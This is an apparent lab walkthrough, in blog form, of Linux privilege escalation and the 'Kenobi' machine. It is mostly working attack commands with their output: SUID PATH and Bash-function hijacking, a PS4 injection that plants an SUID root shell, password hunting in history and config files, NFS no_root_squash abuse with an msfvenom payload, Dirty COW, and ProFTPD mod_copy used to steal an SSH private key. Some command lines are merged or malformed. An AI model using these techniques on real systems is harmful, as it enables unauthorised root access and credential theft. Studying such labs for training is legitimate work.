<p>First, execute the file and note that it seems to be trying to start the apache2 webserver:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin/suid-env</span><br></pre></td></tr></table></figure>

<p>Run strings on the file to look for strings of printable characters:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /usr/local/bin/suid-env</span><br></pre></td></tr></table></figure>

<p>One line (“service apache2 start”) suggests that the <strong>service</strong> executable is being called to start the webserver, <strong>however the full path of the executable (&#x2F;usr&#x2F;sbin&#x2F;service) is not being used.</strong></p>
<p>Compile the code located at <strong>&#x2F;home&#x2F;user&#x2F;tools&#x2F;suid&#x2F;service.c</strong> into an executable called <strong>service</strong>. This code simply spawns a Bash shell:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gcc -o service /home/user/tools/suid/service.c</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">        setuid(0);</span><br><span class="line">        system(&quot;/bin/bash -p&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the <strong>suid-env</strong> executable to gain a root shell:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PATH=.:$PATH /usr/local/bin/suid-env</span><br></pre></td></tr></table></figure>

<p><strong>Remember to exit out of the root shell before continuing!</strong></p>
<p>The <strong>&#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-env2</strong> executable is identical to <strong>&#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-env</strong> except that it uses the absolute path of the service executable (&#x2F;usr&#x2F;sbin&#x2F;service) to start the apache2 webserver.</p>
<p>Verify this with strings:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /usr/local/bin/suid-env2</span><br></pre></td></tr></table></figure>

<p>In Bash versions <strong>&lt;4.2-048</strong> it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.</p>
<p>Verify the version of Bash installed on the Debian VM is less than 4.2-048:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash --version</span><br></pre></td></tr></table></figure>

<p>Create a Bash function with the name “<strong>&#x2F;usr&#x2F;sbin&#x2F;service</strong>“ that executes a new Bash shell (using -p so permissions are preserved) and export the function:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function /usr/sbin/service &#123; /bin/bash -p; &#125;export -f /usr/sbin/service</span><br></pre></td></tr></table></figure>

<p>Run the <strong>suid-env2</strong> executable to gain a root shell:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin/suid-env2</span><br></pre></td></tr></table></figure>

<p><strong>Remember to exit out of the root shell before continuing!</strong></p>
<p>Note: This will not work on Bash versions 4.4 and above.</p>
<p>When in debugging mode, Bash uses the environment variable <strong>PS4</strong> to display an extra prompt for debugging statements.</p>
<p>Run the <strong>&#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-env2</strong> executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of &#x2F;bin&#x2F;bash:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">env -i SHELLOPTS=xtrace PS4=&#x27;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)&#x27; /usr/local/bin/suid-env2</span><br><span class="line"></span><br><span class="line">//-i    new a null PATH</span><br></pre></td></tr></table></figure>

<p>Run the &#x2F;tmp&#x2F;rootbash executable with -p to gain a shell running with root privileges:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/rootbash -p</span><br></pre></td></tr></table></figure>

<p><strong>Remember to remove the &#x2F;tmp&#x2F;rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/rootbashexit</span><br></pre></td></tr></table></figure>



<p><strong>Passwords</strong></p>
<p>If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.</p>
<p>View the contents of all the hidden history files in the user’s home directory:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.*history | less</span><br></pre></td></tr></table></figure>

<p>Note that the user has tried to connect to a MySQL server at some point, using the “root” username and a password submitted via the command line. Note that there is no space between the -p option and the password!</p>
<p>Switch to the root user, using the password:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure>



<p>Config files often contain passwords in plaintext or other reversible formats.</p>
<p>List the contents of the user’s home directory:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /home/user</span><br></pre></td></tr></table></figure>

<p>Note the presence of a <strong>myvpn.ovpn</strong> config file. View the contents of the file:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/user/myvpn.ovpn</span><br></pre></td></tr></table></figure>

<p>The file should contain a reference to another location where the root user’s credentials can be found. Switch to the root user, using the credentials:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -la /</span><br><span class="line">ls -l /.ssh</span><br><span class="line">chmod 600 root_key</span><br><span class="line">ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.238.109</span><br></pre></td></tr></table></figure>



<p><strong>NFS</strong></p>
<p>Files created via NFS inherit the <strong>remote</strong> user’s ID. If the user is root, and root squashing is enabled, the ID will instead be set to the “nobody” user.</p>
<p>Check the NFS share configuration on the Debian VM:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/exports</span><br></pre></td></tr></table></figure>

<p>Note that the <strong>&#x2F;tmp</strong> share has root squashing disabled.</p>
<p>On your Kali box, switch to your root user if you are not already running as root:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>

<p>Using Kali’s root user, create a mount point on your Kali box and mount the <strong>&#x2F;tmp</strong> share (update the IP accordingly):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/nfsmount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs</span><br></pre></td></tr></table></figure>

<p>Still using Kali’s root user, generate a payload using <strong>msfvenom</strong> and save it to the mounted share (this payload simply calls &#x2F;bin&#x2F;bash):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o /tmp/nfs/shell.elf</span><br></pre></td></tr></table></figure>

<p>Still using Kali’s root user, make the file executable and set the SUID permission:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +xs /tmp/nfs/shell.elf</span><br></pre></td></tr></table></figure>

<p>Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/shell.elf</span><br></pre></td></tr></table></figure>

<p>What is the name of the option that disables root squashing?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no_root_squash</span><br></pre></td></tr></table></figure>



<p><strong>Kernel Exploits</strong></p>
<p>Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.</p>
<p>Run the <strong>Linux Exploit Suggester 2</strong> tool to identify potential kernel exploits on the current system:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl</span><br></pre></td></tr></table></figure>

<p>The popular Linux kernel exploit “Dirty COW” should be listed. Exploit code for Dirty COW can be found at <strong>&#x2F;home&#x2F;user&#x2F;tools&#x2F;kernel-exploits&#x2F;dirtycow&#x2F;c0w.c</strong>. It replaces the SUID file &#x2F;usr&#x2F;bin&#x2F;passwd with one that spawns a shell (a backup of &#x2F;usr&#x2F;bin&#x2F;passwd is made at &#x2F;tmp&#x2F;bak).</p>
<p>Compile the code and run it (note that it may take several minutes to complete):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w./c0w</span><br></pre></td></tr></table></figure>

<p>Once the exploit completes, run &#x2F;usr&#x2F;bin&#x2F;passwd to gain a root shell:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/passwd</span><br></pre></td></tr></table></figure>

<p>Remember to restore the original <strong>&#x2F;usr&#x2F;bin&#x2F;passwd</strong> file and exit the root shell before continuing!</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /tmp/bak /usr/bin/passwdexit</span><br></pre></td></tr></table></figure>



<p><strong>Tools</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LinEnum.sh  linpeas.sh  lse.sh</span><br></pre></td></tr></table></figure>

<h1 id="kenobi"><a href="#kenobi" class="headerlink" title="kenobi"></a>kenobi</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV 10.10.215.171</span><br><span class="line"></span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         ProFTPD 1.3.5</span><br><span class="line">22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)</span><br><span class="line">|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)</span><br><span class="line">|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)</span><br><span class="line">80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/admin.html</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">111/tcp  open  rpcbind     2-4 (RPC #100000)</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100003  2,3,4       2049/tcp   nfs</span><br><span class="line">|   100003  2,3,4       2049/tcp6  nfs</span><br><span class="line">|   100003  2,3,4       2049/udp   nfs</span><br><span class="line">|   100003  2,3,4       2049/udp6  nfs</span><br><span class="line">|   100005  1,2,3      39562/udp6  mountd</span><br><span class="line">|   100005  1,2,3      44287/udp   mountd</span><br><span class="line">|   100005  1,2,3      57415/tcp6  mountd</span><br><span class="line">|   100005  1,2,3      58933/tcp   mountd</span><br><span class="line">|   100021  1,3,4      42750/udp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      45283/tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      45523/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      55170/udp   nlockmgr</span><br><span class="line">|   100227  2,3         2049/tcp   nfs_acl</span><br><span class="line">|   100227  2,3         2049/tcp6  nfs_acl</span><br><span class="line">|   100227  2,3         2049/udp   nfs_acl</span><br><span class="line">|_  100227  2,3         2049/udp6  nfs_acl</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)          </span><br><span class="line">2049/tcp open  nfs_acl     2-3 (RPC #100227)</span><br><span class="line">MAC Address: 02:8A:BF:E2:69:EE (Unknown)</span><br><span class="line">Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel        </span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s</span><br><span class="line">|_nbstat: NetBIOS name: KENOBI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: kenobi</span><br><span class="line">|   NetBIOS computer name: KENOBI\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: kenobi</span><br><span class="line">|_  System time: 2020-04-07T06:36:48-05:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-04-07T11:36:48</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.60 seconds</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirb -u http://10.10.215.171/</span><br><span class="line"></span><br><span class="line">nothing</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.215.171</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">MAC Address: 02:8A:BF:E2:69:EE (Unknown)</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-enum-shares: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   \\10.10.68.87\IPC$: </span><br><span class="line">|     Type: STYPE_IPC_HIDDEN</span><br><span class="line">|     Comment: IPC Service (kenobi server (Samba, Ubuntu))</span><br><span class="line">|     Users: 1</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\tmp</span><br><span class="line">|     Anonymous access: READ/WRITE</span><br><span class="line">|     Current user access: READ/WRITE</span><br><span class="line">|   \\10.10.68.87\anonymous: </span><br><span class="line">|     Type: STYPE_DISKTREE</span><br><span class="line">|     Comment: </span><br><span class="line">|     Users: 0</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\home\kenobi\share</span><br><span class="line">|     Anonymous access: READ/WRITE</span><br><span class="line">|     Current user access: READ/WRITE</span><br><span class="line">|   \\10.10.68.87\print$: </span><br><span class="line">|     Type: STYPE_DISKTREE</span><br><span class="line">|     Comment: Printer Drivers</span><br><span class="line">|     Users: 0</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\var\lib\samba\printers</span><br><span class="line">|     Anonymous access: &lt;none&gt;</span><br><span class="line">|_    Current user access: &lt;none&gt;</span><br><span class="line">|_smb-enum-users: ERROR: Script execution failed (use -d to debug)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.09 seconds</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.215.171/anonymous</span><br><span class="line"></span><br><span class="line">Enter WORKGROUP\root&#x27;s password: </span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; dir</span><br><span class="line">  .                                   D        0  Wed Sep  4 10:49:09 2019</span><br><span class="line">  ..                                  D        0  Wed Sep  4 10:56:07 2019</span><br><span class="line">  log.txt                             N    12237  Wed Sep  4 10:49:09 2019</span><br><span class="line">                9204224 blocks of size 1024. 6855348 blocks available</span><br><span class="line"></span><br><span class="line">get log.txt</span><br><span class="line"></span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): </span><br><span class="line">Created directory &#x27;/home/kenobi/.ssh&#x27;.</span><br><span class="line">Enter passphrase (empty for no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved in /home/kenobi/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobiobi</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.215.171</span><br><span class="line"></span><br><span class="line">Connected to 10.10.215.171.</span><br><span class="line">220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.215.171]</span><br><span class="line">Name (10.10.215.171:yake-daigua): </span><br><span class="line">331 Password required for yake-daigua</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">searchexploit ProFTPD 1.3.5</span><br><span class="line">//http://www.proftpd.org/docs/contrib/mod_copy.html</span><br><span class="line"></span><br><span class="line">nc 10.10.215.171 21</span><br><span class="line">SITE CPFR /home/kenobi/.ssh/id_rsa</span><br><span class="line">SITE CPTO /var/tmp/id_rsa</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.215.171</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">111/tcp open  rpcbind</span><br><span class="line">| nfs-ls: Volume /var</span><br><span class="line">|   access: Read Lookup NoModify NoExtend NoDelete NoExecute</span><br><span class="line">| PERMISSION  UID  GID  SIZE  TIME                 FILENAME</span><br><span class="line">| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .</span><br><span class="line">| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..</span><br><span class="line">| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups</span><br><span class="line">| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache</span><br><span class="line">| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash</span><br><span class="line">| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local</span><br><span class="line">| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock</span><br><span class="line">| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log</span><br><span class="line">| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap</span><br><span class="line">| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www</span><br><span class="line">|_</span><br><span class="line">| nfs-showmount: </span><br><span class="line">|_  /var *</span><br><span class="line">| nfs-statfs: </span><br><span class="line">|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink</span><br><span class="line">|_  /var        9204224.0  1858288.0  6855340.0  22%   16.0T        32000</span><br><span class="line">MAC Address: 02:8A:BF:E2:69:EE (Unknown)</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mount 10.10.215.171:/var /tmp</span><br><span class="line">cp /tmp/tmp/id_rsa /home/yake-daigua/Desktop</span><br><span class="line">cd /home/yake-daigua/Desktop</span><br><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh -i id_rsa kenobi@10.10.215.171</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l &#123;&#125; \; 2&gt; /dev/null</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x 1 root root 94240 May  8  2019 /sbin/mount.nfs</span><br><span class="line">-rwxr-sr-x 1 root shadow 35632 Apr  9  2018 /sbin/pam_extrausers_chkpwd</span><br><span class="line">-rwxr-sr-x 1 root shadow 35600 Apr  9  2018 /sbin/unix_chkpwd</span><br><span class="line">-rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">-rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine</span><br><span class="line">-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device</span><br><span class="line">-rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign</span><br><span class="line">-rwxr-sr-x 1 root utmp 10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter</span><br><span class="line">-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn</span><br><span class="line">-rwxr-sr-x 1 root shadow 22768 May 16  2017 /usr/bin/expiry</span><br><span class="line">-rwxr-sr-x 1 root utmp 434216 Feb  7  2016 /usr/bin/screen</span><br><span class="line">-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap</span><br><span class="line">-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec</span><br><span class="line">-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap</span><br><span class="line">-rwxr-sr-x 1 root ssh 358624 Jan 31  2019 /usr/bin/ssh-agent</span><br><span class="line">-rwxr-sr-x 1 root shadow 62336 May 16  2017 /usr/bin/chage</span><br><span class="line">-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 8880 Sep  4  2019 /usr/bin/menu</span><br><span class="line">-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo</span><br><span class="line">-rwxr-sr-x 1 root crontab 36080 Apr  5  2016 /usr/bin/crontab</span><br><span class="line">-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh</span><br><span class="line">-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at</span><br><span class="line">-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp</span><br><span class="line">-rwxr-sr-x 1 root tty 27368 May 16  2018 /usr/bin/wall</span><br><span class="line">-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount</span><br><span class="line">-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount</span><br><span class="line">-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount</span><br><span class="line">-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping</span><br><span class="line">-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 44680 May  7  